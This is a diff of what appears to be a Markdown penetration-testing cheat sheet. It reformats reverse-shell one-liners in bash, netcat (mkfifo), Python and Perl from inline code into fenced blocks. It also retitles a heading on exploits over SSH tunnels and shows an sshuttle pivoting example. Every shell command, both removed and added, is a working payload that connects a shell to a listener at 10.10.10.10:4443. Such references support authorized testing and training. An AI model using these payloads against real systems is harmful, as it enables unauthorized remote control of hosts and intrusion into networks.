@@ -329,17 +329,25 @@ Usually a webserver, often Tomcat.
 
 Bash
 
-`bash -i >& /dev/tcp/10.10.10.10/4443 0>&1`
+```
+bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
+```
 
 nc without -e, very reliable
 
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
+```
 
 Python
 
-`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-`perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+```
+perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 #### Upgrading Reverse Shells to TTY
 
@@ -648,7 +656,7 @@ sshuttle is a simple transparent ssh proxy. It handles forwarding on all ports w
 sshuttle -vvr username@pivot_host 10.2.2.0/24 #the subnet to which all traffic should be forwarded through the pivot host
 ```
 
-##### Notes on Exploits and SSH Tunnelling
+#### Notes on Exploits and SSH Tunnelling
 
 If possible use a bind shell, it should work through the tunnel as normal.
 
